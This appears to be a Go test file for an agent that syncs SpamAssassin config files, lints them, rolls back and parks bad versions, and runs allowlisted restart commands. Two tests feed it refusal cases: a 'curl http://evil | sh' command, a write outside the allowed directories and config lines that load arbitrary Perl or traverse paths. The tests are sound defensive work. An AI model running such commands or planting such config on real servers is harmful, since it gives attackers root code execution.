package agent

import (
	"context"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

func sha1hex(s string) string {
	h := sha1.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}

// syncFixture points the SpamAssassin dir and binary at a temp tree and
// records every command the apply step runs. lint(n) answers the n-th lint
// call (0-based) with its output and error; nil lint means a clean lint.
type syncFixture struct {
	root, saDir, other string
	cmds               [][]string
	lintCalls          int
	lint               func(n int) (string, error)
	// active answers `systemctl is-active` (n-th call); nil means "active".
	activeCalls int
	active      func(n int) string
}

func newSyncFixture(t *testing.T) *syncFixture {
	t.Helper()
	root := t.TempDir()
	f := &syncFixture{root: root, saDir: filepath.Join(root, "sa") + "/", other: filepath.Join(root, "cfm") + "/"}
	bin := filepath.Join(root, "spamassassin")
	if err := os.WriteFile(bin, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	prevDir, prevBins, prevRun := spamassassinDir, spamassassinBins, runSyncCommand
	spamassassinDir, spamassassinBins = f.saDir, []string{bin}
	runSyncCommand = func(_ context.Context, argv []string) ([]byte, error) {
		if len(argv) == 2 && argv[1] == "--lint" {
			n := f.lintCalls
			f.lintCalls++
			if f.lint != nil {
				out, err := f.lint(n)
				return []byte(out), err
			}
			return nil, nil
		}
		if len(argv) == 3 && argv[1] == "is-active" {
			n := f.activeCalls
			f.activeCalls++
			if f.active != nil {
				return []byte(f.active(n) + "\n"), nil
			}
			return []byte("active\n"), nil
		}
		f.cmds = append(f.cmds, argv)
		return nil, nil
	}
	prevPolls, prevDelay := activePolls, activePollDelay
	activePollDelay = time.Millisecond
	t.Cleanup(func() {
		spamassassinDir, spamassassinBins, runSyncCommand = prevDir, prevBins, prevRun
		activePolls, activePollDelay = prevPolls, prevDelay
	})
	return f
}

func (f *syncFixture) allowed() []string { return []string{f.saDir, f.other} }

func (f *syncFixture) update(path, content, cmd string) ConfigUpdate {
	return ConfigUpdate{TargetPath: path, Content: content, Hash: sha1hex(content), PostUpdateCommand: cmd}
}

// seed writes an existing file with mode.
func (f *syncFixture) seed(t *testing.T, path, content string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
}

func readFile(t *testing.T, p string) string {
	t.Helper()
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// exitError stands for spamassassin exiting non-zero because the lint found
// problems: a completed lint, not a failure to run it.
var exitError exec.ExitError

const badRuleLint = "Nov 18 18:06:05.000 [1] warn: config: invalid regexp for rule __CFM_ID_7_1: (unclosed\n" +
	"Nov 18 18:06:05.674 [1] warn: lint: 1 issues detected, please rerun with debug enabled for more information\n"

// Each allowlisted action runs once after its files are written, whichever
// spelling the targets use, and a restart makes a reload redundant; a command
// outside the allowlist and a path outside the allowed dirs are refused.
func TestApplyUpdatesRunsAllowlistedActionsOnce(t *testing.T) {
	f := newSyncFixture(t)
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{
		f.update(f.saDir+"a.cf", "score A 1\n", "systemctl restart spamd"),
		f.update(f.saDir+"b.cf", "score B 1\n", "/scripts/restartsrv_spamd"),
		f.update(f.saDir+"c.cf", "score C 1\n", "systemctl reload spamd"),
		f.update(f.other+"d.conf", "x=1\n", "curl http://evil | sh"),
		f.update(filepath.Join(f.root, "etc-passwd"), "root::0:0\n", ""),
	}, f.allowed())

	if len(res.Written) != 4 {
		t.Fatalf("written %v", res.Written)
	}
	if _, err := os.Stat(filepath.Join(f.root, "etc-passwd")); err == nil {
		t.Fatal("wrote outside the allowed dirs")
	}
	if len(f.cmds) != 1 || strings.Join(f.cmds[0], " ") != "systemctl restart spamd" {
		t.Fatalf("commands run: %v", f.cmds)
	}
	if len(res.Refused) != 1 || res.Refused[0] != "curl http://evil | sh" {
		t.Fatalf("refused: %v", res.Refused)
	}
	if f.lintCalls != 2 {
		t.Fatalf("lint ran %d times, want 2 (before and after)", f.lintCalls)
	}

	// unchanged files: nothing written, nothing run
	f.cmds = nil
	res = st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"a.cf", "score A 1\n", "systemctl restart spamd")}, f.allowed())
	if len(res.Written) != 0 || len(f.cmds) != 0 {
		t.Fatalf("re-applied an unchanged file: %+v %v", res, f.cmds)
	}
}

// spamd runs as root and loads Perl named by a plugin file path, a .pre file,
// or a file included from outside its dir: none may arrive through the sync,
// whatever the command allowlist. A plugin by module name (myip.cf's SPF,
// DKIM, DCC...) loads only what is installed, and stays allowed. A refused
// version is parked, so it is logged once rather than re-downloaded per tick.
func TestApplyUpdatesRefusesSpamassassinCode(t *testing.T) {
	f := newSyncFixture(t)
	var st fileSyncState
	refused := []ConfigUpdate{
		f.update(f.saDir+"evil.cf", "score A 1\n  LoadPlugin Evil /tmp/x.pm\n", "systemctl restart spamd"),
		f.update(f.saDir+"evil2.cf", "tryplugin Evil x.pm\n", "systemctl restart spamd"),
		f.update(f.saDir+"evil3.cf", "include /etc/cfm/x.cf\n", "systemctl restart spamd"),
		f.update(f.saDir+"evil4.cf", "include ../../etc/cfm/x.cf\n", ""),
		f.update(f.saDir+"evil5.cf", "loadplugin Foo;system(\"id\")\n", ""),
		f.update(f.saDir+"v999.pre", "score A 1\n", "systemctl restart spamd"),
		f.update(f.saDir+"x.pm", "1;\n", ""),
	}
	res := st.applyUpdates(context.Background(), refused, f.allowed())
	if len(res.Written) != 0 || len(f.cmds) != 0 || f.lintCalls != 0 {
		t.Fatalf("code reached spamd: %+v cmds=%v lints=%d", res, f.cmds, f.lintCalls)
	}
	for _, u := range refused {
		if _, err := os.Stat(u.TargetPath); err == nil {
			t.Errorf("%s written", u.TargetPath)
		}
		if !st.isParked(u.TargetPath, u.Hash) {
			t.Errorf("%s not parked", u.TargetPath)
		}
	}
	res = st.applyUpdates(context.Background(), []ConfigUpdate{
		f.update(f.saDir+"myip.cf", "loadplugin    Mail::SpamAssassin::Plugin::DCC\nloadplugin Mail::SpamAssassin::Plugin::SPF # sender checks\ndcc_home /var/dcc\n", ""),
		f.update(f.saDir+"inc.cf", "include extra/rules.cf\ninclude "+f.saDir+"more.cf\n", ""),
		f.update(f.saDir+"ok.cf", "describe X mentions loadplugin in text\n", ""),
	}, f.allowed())
	if len(res.Written) != 3 {
		t.Fatalf("allowed content refused: %+v", res)
	}
}

// A lint problem the update introduced rolls the file back (old content and
// mode), skips the restart, and parks that version; a new version applies.
// A rewrite keeps the file's mode, and a new file gets 0644 under the
// SpamAssassin dir (spamd reads its config without root) and 0600 elsewhere.
// Before, every write was 0600, which made spamd skip myip.cf fleet-wide.
func TestApplyUpdatesKeepsOrSetsTheFileMode(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"myip.cf", "old\n", 0o644)
	f.seed(t, f.other+"private.conf", "old\n", 0o640)
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{
		f.update(f.saDir+"myip.cf", "new\n", ""),
		f.update(f.saDir+"new-rules.cf", "rules\n", ""),
		f.update(f.other+"private.conf", "new\n", ""),
		f.update(f.other+"new.conf", "x=1\n", ""),
	}, f.allowed())
	if len(res.Written) != 4 {
		t.Fatalf("written %v", res.Written)
	}
	for path, want := range map[string]os.FileMode{
		f.saDir + "myip.cf":      0o644,
		f.saDir + "new-rules.cf": 0o644,
		f.other + "private.conf": 0o640,
		f.other + "new.conf":     0o600,
	} {
		fi, err := os.Stat(path)
		if err != nil {
			t.Fatal(err)
		}
		if got := fi.Mode().Perm(); got != want {
			t.Errorf("%s: mode %o, want %o", path, got, want)
		}
	}
}

func TestApplyUpdatesRollsBackOnNewLintProblem(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"rules.cf", "old rules\n", 0o644)
	f.lint = func(n int) (string, error) {
		if n == 1 { // the run after the bad write
			return badRuleLint, &exitError
		}
		return "", nil
	}
	var st fileSyncState
	bad := f.update(f.saDir+"rules.cf", "body __CFM_ID_7_1 /(unclosed/\n", "systemctl restart spamd")
	other := f.update(f.other+"cfm.conf", "x=1\n", "")
	res := st.applyUpdates(context.Background(), []ConfigUpdate{bad, other}, f.allowed())

	if got := readFile(t, f.saDir+"rules.cf"); got != "old rules\n" {
		t.Fatalf("not rolled back: %q", got)
	}
	if fi, _ := os.Stat(f.saDir + "rules.cf"); fi.Mode().Perm() != 0o644 {
		t.Fatalf("rollback changed the mode to %o", fi.Mode().Perm())
	}
	if len(res.RolledBack) != 1 || len(f.cmds) != 0 {
		t.Fatalf("rolled back %v, ran %v", res.RolledBack, f.cmds)
	}
	if readFile(t, f.other+"cfm.conf") != "x=1\n" {
		t.Fatal("a non-SpamAssassin file was rolled back too")
	}
	if !st.isParked(f.saDir+"rules.cf", bad.Hash) {
		t.Fatal("bad version not parked")
	}

	// the same bad version is not linted again every tick
	f.lintCalls = 0
	res = st.applyUpdates(context.Background(), []ConfigUpdate{bad}, f.allowed())
	if len(res.Written) != 0 || f.lintCalls != 0 {
		t.Fatalf("parked version re-applied: %+v, %d lints", res, f.lintCalls)
	}

	// a fixed version goes through and restarts spamd
	f.lint = nil
	fixed := f.update(f.saDir+"rules.cf", "body __CFM_ID_7_1 /closed/\n", "systemctl restart spamd")
	res = st.applyUpdates(context.Background(), []ConfigUpdate{fixed}, f.allowed())
	if len(res.Written) != 1 || len(f.cmds) != 1 || readFile(t, f.saDir+"rules.cf") != fixed.Content {
		t.Fatalf("fixed version not applied: %+v %v", res, f.cmds)
	}
	if st.isParked(f.saDir+"rules.cf", bad.Hash) {
		t.Fatal("parked entry kept after a good version")
	}
}

// When several SpamAssassin files change together and the lint breaks, each
// is retried alone: the good one is kept (and restarts spamd), only the bad
// one is parked.
func TestApplyUpdatesIsolatesTheBadFile(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"mailfromfilters.cf", "old filters\n", 0o600)
	f.seed(t, f.saDir+"keywords.cf", "old keywords\n", 0o600)
	good := f.update(f.saDir+"mailfromfilters.cf", "new filters\n", "systemctl restart spamd")
	bad := f.update(f.saDir+"keywords.cf", "body __CFM_ID_7_1 /(unclosed/\n", "systemctl restart spamd")
	// lint reports the problem whenever the bad content is on disk
	f.lint = func(int) (string, error) {
		if b, _ := os.ReadFile(f.saDir + "keywords.cf"); string(b) == bad.Content {
			return badRuleLint, &exitError
		}
		return "", nil
	}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{good, bad}, f.allowed())

	if readFile(t, f.saDir+"mailfromfilters.cf") != good.Content {
		t.Fatal("the good file was not kept")
	}
	if readFile(t, f.saDir+"keywords.cf") != "old keywords\n" {
		t.Fatal("the bad file was not rolled back")
	}
	if st.isParked(f.saDir+"mailfromfilters.cf", good.Hash) || !st.isParked(f.saDir+"keywords.cf", bad.Hash) {
		t.Fatalf("parked %v", st.parked)
	}
	if len(res.Written) != 1 || len(res.RolledBack) != 1 || len(f.cmds) != 1 {
		t.Fatalf("%+v cmds=%v", res, f.cmds)
	}
}

// A file that did not exist before is removed again on rollback.
func TestApplyUpdatesRollbackRemovesNewFile(t *testing.T) {
	f := newSyncFixture(t)
	f.lint = func(n int) (string, error) {
		if n == 1 {
			return "warn: config: failed to parse line, skipping, in \"new.cf\": bogus\n", &exitError
		}
		return "", nil
	}
	var st fileSyncState
	st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"new.cf", "bogus\n", "")}, f.allowed())
	if _, err := os.Stat(f.saDir + "new.cf"); !os.IsNotExist(err) {
		t.Fatalf("new file kept after a failed lint: %v", err)
	}
}

// Problems that were there before the update do not block it, even when the
// update moves them: rigel's dcc_home warning in myip.cf changes "(line 33)"
// when lines are added above it, and titan's missing Hashcash plugin warning
// carries Perl eval/DATA counters that move whenever a rule file grows.
func TestApplyUpdatesIgnoresPreexistingLintProblems(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"myip.cf", "dcc_home /var/dcc\n", 0o600)
	f.lint = func(n int) (string, error) {
		line := []string{"33", "34"}[n]
		evalN := []string{"180", "181"}[n]
		return "Nov 18 18:06:05.000 [270837] warn: config: invalid 'dcc_home' value in /etc/mail/spamassassin/myip.cf (line " + line + "): dcc_home /var/dcc\n" +
			"Nov 18 18:06:07.432 [1707296] warn: plugin: failed to parse plugin (from @INC): Can't locate Mail/SpamAssassin/Plugin/Hashcash.pm at (eval " + evalN + ") line 1, <DATA> line 71" + evalN[2:] + ".\n" +
			"Nov 18 18:06:05.674 [270837] warn: lint: 2 issues detected, please rerun with debug enabled for more information\n", &exitError
	}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"myip.cf", "score Y 1\ndcc_home /var/dcc\n", "/scripts/restartsrv_spamd")}, f.allowed())
	if len(res.Written) != 1 || len(res.RolledBack) != 0 || len(f.cmds) != 1 || strings.Join(f.cmds[0], " ") != "systemctl restart spamd" {
		t.Fatalf("pre-existing lint problems blocked the update: %+v %v", res, f.cmds)
	}
}

// A lint that does not complete is not a result: with no baseline the change
// waits for the next sync (unwritten); with no after-lint it is rolled back
// but not parked.
func TestApplyUpdatesLintFailures(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"rules.cf", "old\n", 0o600)
	u := f.update(f.saDir+"rules.cf", "new\n", "systemctl restart spamd")
	var st fileSyncState

	f.lint = func(int) (string, error) { return "", errors.New("exec: spamassassin: killed") }
	res := st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
	if len(res.Deferred) != 1 || readFile(t, f.saDir+"rules.cf") != "old\n" || len(f.cmds) != 0 {
		t.Fatalf("baseline failure: %+v", res)
	}

	st.lintRetryAt = time.Time{} // past the backoff the first failure set
	f.lintCalls = 0
	f.lint = func(n int) (string, error) {
		if n == 1 {
			return "", errors.New("exec: spamassassin: killed")
		}
		return "", nil
	}
	res = st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
	if len(res.RolledBack) != 1 || readFile(t, f.saDir+"rules.cf") != "old\n" || len(f.cmds) != 0 {
		t.Fatalf("after-lint failure: %+v", res)
	}
	if st.isParked(f.saDir+"rules.cf", u.Hash) {
		t.Fatal("parked a version that was never judged")
	}
}

// A target that exists but cannot be read is left alone: a rollback could not
// restore it.
func TestApplyUpdatesSkipsUnreadableTarget(t *testing.T) {
	f := newSyncFixture(t)
	if err := os.MkdirAll(f.other+"dir.conf", 0o750); err != nil { // reading a directory fails with EISDIR
		t.Fatal(err)
	}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.other+"dir.conf", "x=1\n", "")}, f.allowed())
	if len(res.Written) != 0 {
		t.Fatalf("%+v", res)
	}
	if fi, err := os.Stat(f.other + "dir.conf"); err != nil || !fi.IsDir() {
		t.Fatal("the unreadable target was replaced")
	}
}

// Without a spamassassin binary the files still apply (nothing to lint with).
func TestApplyUpdatesWithoutSpamassassinBinary(t *testing.T) {
	f := newSyncFixture(t)
	spamassassinBins = []string{filepath.Join(f.root, "absent")}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"rules.cf", "score X 1\n", "systemctl reload spamd")}, f.allowed())
	if len(res.Written) != 1 || f.lintCalls != 0 || len(f.cmds) != 1 {
		t.Fatalf("%+v lints=%d cmds=%v", res, f.lintCalls, f.cmds)
	}
}

// syncConfigs does not download a parked version again: the hash cfm-web
// lists for the path is the one that failed the lint.
func TestSyncConfigsSkipsParkedDownload(t *testing.T) {
	f := newSyncFixture(t)
	path := f.saDir + "keywords.cf"
	bad := f.update(path, "body __CFM_ID_7_1 /(unclosed/\n", "systemctl restart spamd")
	var getUpdates atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/agent/list-files":
			_ = json.NewEncoder(w).Encode(map[string]any{"tracked_files": map[string]string{path: bad.Hash}})
		case "/api/agent/get-updates":
			getUpdates.Add(1)
			_ = json.NewEncoder(w).Encode(map[string]any{"configs": []ConfigUpdate{bad}})
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()
	r := New(Config{BaseURL: srv.URL, Token: "t", Interval: time.Hour})
	r.files.parked = map[string]string{path: bad.Hash}
	r.syncConfigs(context.Background())
	if n := getUpdates.Load(); n != 0 {
		t.Fatalf("get-updates called %d times for a parked version", n)
	}
}

// startConfigSync never runs two syncs at once: a tick during a slow sync is
// skipped rather than queued.
func TestStartConfigSyncDoesNotOverlap(t *testing.T) {
	entered := make(chan struct{}, 4)
	release := make(chan struct{})
	var listCalls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		listCalls.Add(1)
		entered <- struct{}{}
		<-release
		_ = json.NewEncoder(w).Encode(map[string]any{"tracked_files": map[string]string{}})
	}))
	defer srv.Close()
	r := New(Config{BaseURL: srv.URL, Token: "t", Interval: time.Hour})
	r.startConfigSync()
	<-entered           // the first sync is inside its request
	r.startConfigSync() // still running: skipped
	close(release)
	deadline := time.Now().Add(10 * time.Second)
	for r.fileSyncRunning.Load() && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if r.fileSyncRunning.Load() {
		t.Fatal("sync still marked running")
	}
	if n := listCalls.Load(); n != 1 {
		t.Fatalf("list-files called %d times, want 1", n)
	}
}

// The same warning on a second line is a new problem even though its text
// matches one that was already there.
func TestApplyUpdatesCountsRepeatedLintProblems(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"myip.cf", "dcc_home /var/dcc\n", 0o600)
	warn := "warn: config: invalid 'dcc_home' value in /etc/mail/spamassassin/myip.cf (line %s): dcc_home /var/dcc\n"
	f.lint = func(n int) (string, error) {
		out := strings.Replace(warn, "%s", "1", 1)
		if n == 1 {
			out += strings.Replace(warn, "%s", "9", 1)
		}
		return out, &exitError
	}
	var st fileSyncState
	u := f.update(f.saDir+"myip.cf", "dcc_home /var/dcc\nscore X 1\ndcc_home /var/dcc\n", "systemctl restart spamd")
	res := st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
	if len(res.RolledBack) != 1 || len(f.cmds) != 0 || !st.isParked(f.saDir+"myip.cf", u.Hash) {
		t.Fatalf("a second copy of a known warning passed: %+v cmds=%v", res, f.cmds)
	}
}

// Many SpamAssassin files changing together with one bad: the bad one is
// found by halving the set, in fewer lints than one per file.
func TestApplyUpdatesBisectsManyFiles(t *testing.T) {
	f := newSyncFixture(t)
	var ups []ConfigUpdate
	for i := 0; i < 8; i++ {
		ups = append(ups, f.update(f.saDir+fmt.Sprintf("r%d.cf", i), fmt.Sprintf("score R%d 1\n", i), "systemctl restart spamd"))
	}
	badPath := f.saDir + "r5.cf"
	ups[5] = f.update(badPath, "body __BAD /(unclosed/\n", "systemctl restart spamd")
	f.lint = func(int) (string, error) {
		if b, _ := os.ReadFile(badPath); string(b) == ups[5].Content {
			return badRuleLint, &exitError
		}
		return "", nil
	}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), ups, f.allowed())
	if len(res.Written) != 7 || !st.isParked(badPath, ups[5].Hash) || len(f.cmds) != 1 {
		t.Fatalf("%+v parked=%v cmds=%v", res, st.parked, f.cmds)
	}
	if _, err := os.Stat(badPath); !os.IsNotExist(err) {
		t.Fatal("bad file left on disk")
	}
	if f.lintCalls >= 1+1+8 {
		t.Fatalf("%d lints: no better than one per file", f.lintCalls)
	}
}

// A lint that keeps failing is retried with a growing delay, not on every
// tick; a lint that completes resets the delay.
func TestApplyUpdatesLintBackoff(t *testing.T) {
	f := newSyncFixture(t)
	clock := time.Date(2026, 11, 18, 18, 0, 0, 0, time.UTC)
	prevNow := now
	now = func() time.Time { return clock }
	defer func() { now = prevNow }()
	f.lint = func(int) (string, error) { return "", context.DeadlineExceeded }
	u := f.update(f.saDir+"rules.cf", "score X 1\n", "systemctl restart spamd")
	var st fileSyncState

	st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
	if f.lintCalls != 1 || st.lintBackoff != lintBackoffMin {
		t.Fatalf("lints=%d backoff=%s", f.lintCalls, st.lintBackoff)
	}
	clock = clock.Add(30 * time.Second) // before the retry time: no lint
	res := st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
	if f.lintCalls != 1 || len(res.Deferred) != 1 {
		t.Fatalf("linted again inside the backoff: %d", f.lintCalls)
	}
	clock = clock.Add(time.Minute) // past it: lint, fail, double
	st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
	if f.lintCalls != 2 || st.lintBackoff != 2*lintBackoffMin {
		t.Fatalf("lints=%d backoff=%s", f.lintCalls, st.lintBackoff)
	}
	clock = clock.Add(3 * time.Minute)
	f.lint = nil
	res = st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
	if len(res.Written) != 1 || !st.lintRetryAt.IsZero() || st.lintBackoff != 0 {
		t.Fatalf("a completed lint did not reset the backoff: %+v %+v", res, st)
	}
}

// Stopping the agent (a cancelled sync context) must not cancel a restart in
// flight: systemd gets the job and the command keeps its own timeout.
func TestPostUpdateNotCancelledByStop(t *testing.T) {
	f := newSyncFixture(t)
	var cmdCtxErr error
	runSyncCommand = func(ctx context.Context, argv []string) ([]byte, error) {
		if len(argv) == 2 && argv[1] == "--lint" {
			return nil, nil
		}
		if len(argv) == 3 && argv[1] == "is-active" {
			return []byte("active\n"), nil
		}
		cmdCtxErr = ctx.Err()
		f.cmds = append(f.cmds, argv)
		return nil, nil
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	var st fileSyncState
	st.applyUpdates(ctx, []ConfigUpdate{f.update(f.other+"cfm.conf", "x=1\n", "/scripts/restartsrv_spamd")}, f.allowed())
	if len(f.cmds) != 1 || cmdCtxErr != nil {
		t.Fatalf("restart ran under a cancelled context (%v) or not at all: %v", cmdCtxErr, f.cmds)
	}
	if strings.Join(f.cmds[0], " ") != "systemctl restart spamd" {
		t.Fatalf("restartsrv not run as a systemd job: %v", f.cmds[0])
	}
}

// While the lint backoff runs, SpamAssassin files are not downloaded (they
// would only be deferred again); other files still are.
func TestSyncConfigsSkipsSpamassassinDownloadsDuringBackoff(t *testing.T) {
	f := newSyncFixture(t)
	saPath, otherPath := f.saDir+"keywords.cf", f.other+"cfm.conf"
	sa, other := f.update(saPath, "score X 1\n", ""), f.update(otherPath, "x=1\n", "")
	var asked []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/agent/list-files":
			_ = json.NewEncoder(w).Encode(map[string]any{"tracked_files": map[string]string{saPath: sa.Hash, otherPath: other.Hash}})
		case "/api/agent/get-updates":
			var req FileUpdatesRequest
			_ = json.NewDecoder(r.Body).Decode(&req)
			asked = append(asked, req.Files...)
			_ = json.NewEncoder(w).Encode(map[string]any{"configs": []ConfigUpdate{}})
		}
	}))
	defer srv.Close()
	r := New(Config{BaseURL: srv.URL, Token: "t", Interval: time.Hour})
	r.files.lintRetryAt = time.Now().Add(time.Hour)
	r.syncConfigs(context.Background())
	if len(asked) != 1 || asked[0] != otherPath {
		t.Fatalf("downloaded %v during the lint backoff", asked)
	}
}

// When a lint inside the narrowing-down fails to run, the parts not judged
// yet are left unwritten for after the backoff instead of being linted on a
// box that just timed out.
func TestApplyUpdatesBisectStopsOnLintFailure(t *testing.T) {
	f := newSyncFixture(t)
	var ups []ConfigUpdate
	for i := 0; i < 4; i++ {
		ups = append(ups, f.update(f.saDir+fmt.Sprintf("r%d.cf", i), fmt.Sprintf("score R%d 1\n", i), "systemctl restart spamd"))
	}
	f.lint = func(n int) (string, error) {
		switch n {
		case 0:
			return "", nil // baseline
		case 1:
			return badRuleLint, &exitError // the whole set: narrow down
		default:
			return "", context.DeadlineExceeded // first half: did not run
		}
	}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), ups, f.allowed())
	if f.lintCalls != 3 {
		t.Fatalf("%d lints, want 3 (no lint after the failure)", f.lintCalls)
	}
	if len(res.Written) != 0 || len(res.Deferred) != 2 || len(f.cmds) != 0 {
		t.Fatalf("%+v cmds=%v", res, f.cmds)
	}
	for _, u := range ups {
		if _, err := os.Stat(u.TargetPath); err == nil {
			t.Errorf("%s left on disk", u.TargetPath)
		}
		if st.isParked(u.TargetPath, u.Hash) {
			t.Errorf("%s parked without a verdict", u.TargetPath)
		}
	}
}

// spamd that does not come back after the restart: the SpamAssassin files
// this sync wrote are rolled back and parked, and spamd is restarted on the
// old ones. A "activating" phase is waited out, not treated as a failure.
func TestPostUpdateRollsBackWhenSpamdStaysDown(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"myip.cf", "old\n", 0o644)
	f.active = func(n int) string {
		switch n {
		case 0:
			return "activating"
		case 1:
			return "failed" // with the new myip.cf
		default:
			return "active" // after the rollback restart
		}
	}
	var st fileSyncState
	u := f.update(f.saDir+"myip.cf", "new\n", "systemctl restart spamd")
	other := f.update(f.other+"cfm.conf", "x=1\n", "")
	res := st.applyUpdates(context.Background(), []ConfigUpdate{u, other}, f.allowed())

	if readFile(t, f.saDir+"myip.cf") != "old\n" || !st.isParked(f.saDir+"myip.cf", u.Hash) {
		t.Fatal("the SpamAssassin file that kept spamd down was not rolled back and parked")
	}
	if len(f.cmds) != 2 || len(res.Failed) != 0 || len(st.pendingActions) != 0 {
		t.Fatalf("want two restarts and no pending retry: cmds=%v %+v pending=%v", f.cmds, res, st.pendingActions)
	}
	if len(res.Written) != 1 || res.Written[0] != f.other+"cfm.conf" {
		t.Fatalf("written %v", res.Written)
	}
}

// A restart that fails is retried on the next sync even though the files
// already match, until it succeeds.
func TestPostUpdateFailedActionIsRetried(t *testing.T) {
	f := newSyncFixture(t)
	failures := 2
	runSyncCommand = func(_ context.Context, argv []string) ([]byte, error) {
		if len(argv) == 2 && argv[1] == "--lint" {
			return nil, nil
		}
		if len(argv) == 3 && argv[1] == "is-active" {
			return []byte("active\n"), nil
		}
		f.cmds = append(f.cmds, argv)
		if failures > 0 {
			failures--
			return []byte("Job for spamd.service failed"), errors.New("exit status 1")
		}
		return nil, nil
	}
	var st fileSyncState
	// a non-SpamAssassin file: nothing to roll back, the restart just fails
	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.other+"cfm.conf", "x=1\n", "systemctl restart spamd")}, f.allowed())
	if len(res.Failed) != 1 || len(st.pendingActions) != 1 {
		t.Fatalf("failed restart not remembered: %+v pending=%v", res, st.pendingActions)
	}
	clock := time.Now()
	prevNow := now
	now = func() time.Time { return clock }
	defer func() { now = prevNow }()
	st.retryPendingActions() // too soon: not retried
	if len(f.cmds) != 1 {
		t.Fatalf("retried before actionRetryEvery: %v", f.cmds)
	}
	clock = clock.Add(actionRetryEvery + time.Second)
	st.retryPendingActions() // fails again
	if len(st.pendingActions) != 1 {
		t.Fatal("pending action dropped after a second failure")
	}
	clock = clock.Add(actionRetryEvery + time.Second)
	st.retryPendingActions() // succeeds
	if len(st.pendingActions) != 0 || len(f.cmds) != 3 {
		t.Fatalf("pending=%v cmds=%v", st.pendingActions, f.cmds)
	}
	st.retryPendingActions() // nothing left
	if len(f.cmds) != 3 {
		t.Fatal("retried an action that had succeeded")
	}
}

// A reload that leaves spamd down, with the restart on the old files failing
// too: the restart is what stays pending, with its command, and retrying it
// runs `systemctl restart spamd` (it used to store no command and panic).
func TestPostUpdateFailedReloadPendsTheRestart(t *testing.T) {
	f := newSyncFixture(t)
	f.seed(t, f.saDir+"rules.cf", "old\n", 0o600)
	f.active = func(int) string { return "failed" }
	var st fileSyncState
	st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"rules.cf", "new\n", "systemctl reload spamd")}, f.allowed())
	argv, ok := st.pendingActions[actionRestartSpamd]
	if !ok || strings.Join(argv, " ") != "systemctl restart spamd" || len(st.pendingActions) != 1 {
		t.Fatalf("pending %v", st.pendingActions)
	}
	f.active = nil
	f.cmds = nil
	st.actionRetryAt = time.Time{}
	st.retryPendingActions()
	if len(f.cmds) != 1 || strings.Join(f.cmds[0], " ") != "systemctl restart spamd" || len(st.pendingActions) != 0 {
		t.Fatalf("retry ran %v, pending %v", f.cmds, st.pendingActions)
	}
}
